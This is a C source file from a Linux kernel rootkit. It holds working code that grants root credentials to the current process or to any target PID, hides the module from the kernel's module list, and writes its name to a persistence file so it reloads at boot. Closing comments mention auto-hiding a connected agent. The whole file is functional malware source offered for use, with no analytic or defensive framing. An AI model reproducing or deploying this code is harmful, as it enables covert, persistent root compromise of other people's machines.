// SPDX-License-Identifier: GPL-2.0
// core/opsec.c - Escalation, module cloaking, persistence.
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <net/inet_sock.h>
#include "rootkit.h"

// Privilege escalation (current task, used by mkdir trigger)
int rk_escalate(void)
{
	struct cred *new_cred;

	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred)
		return -ENOMEM;
	return commit_creds(new_cred);
}

// Privilege escalation for a remote PID
int rk_escalate_pid(pid_t target_pid)
{
	struct pid *pid_struct;
	struct task_struct *task;
	struct cred *new_cred;
	int ret = -ESRCH;

	rcu_read_lock();
	pid_struct = find_vpid(target_pid);
	if (!pid_struct) {
		rcu_read_unlock();
		return -ESRCH;
	}
	task = pid_task(pid_struct, PIDTYPE_PID);
	if (!task) {
		rcu_read_unlock();
		return -ESRCH;
	}
	get_task_struct(task);
	rcu_read_unlock();

	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred) {
		put_task_struct(task);
		return -ENOMEM;
	}

	ret = 0;
	rcu_read_lock();
	if (pid_alive(task)) {
		const struct cred *old = __task_cred(task);
		rcu_assign_pointer(task->real_cred, new_cred);
		rcu_assign_pointer(task->cred, new_cred);
		put_cred(old);
	} else {
		put_cred(new_cred);
		ret = -ESRCH;
	}
	rcu_read_unlock();

	put_task_struct(task);
	return ret;
}

// Module cloaking
static struct list_head *saved_mod_list;

void rk_cloak(void)
{
	if (saved_mod_list)
		return;
	saved_mod_list = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
}

void rk_uncloak(void)
{
	if (!saved_mod_list)
		return;
	list_add(&THIS_MODULE->list, saved_mod_list);
	saved_mod_list = NULL;
}

// Persistence
int rk_persist(void)
{
	struct file *f;
	loff_t pos = 0;

	f = filp_open(PERSIST_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (IS_ERR(f))
		return PTR_ERR(f);
	kernel_write(f, MODULE_NAME_STR "\n", sizeof(MODULE_NAME_STR), &pos);
	filp_close(f, NULL);
	return 0;
}

int rk_unpersist(void)
{
	struct file *f;

	f = filp_open(PERSIST_PATH, O_WRONLY | O_TRUNC, 0);
	if (IS_ERR(f))
		return PTR_ERR(f);
	filp_close(f, NULL);
	return 0;
}

bool rk_is_persisted(void)
{
	struct file *f;

	f = filp_open(PERSIST_PATH, O_RDONLY, 0);
	if (IS_ERR(f))
		return false;
	filp_close(f, NULL);
	return true;
}

// Auto-hide: make the agent invisible while connected.
// Auto-unhide: clean up on disconnect.
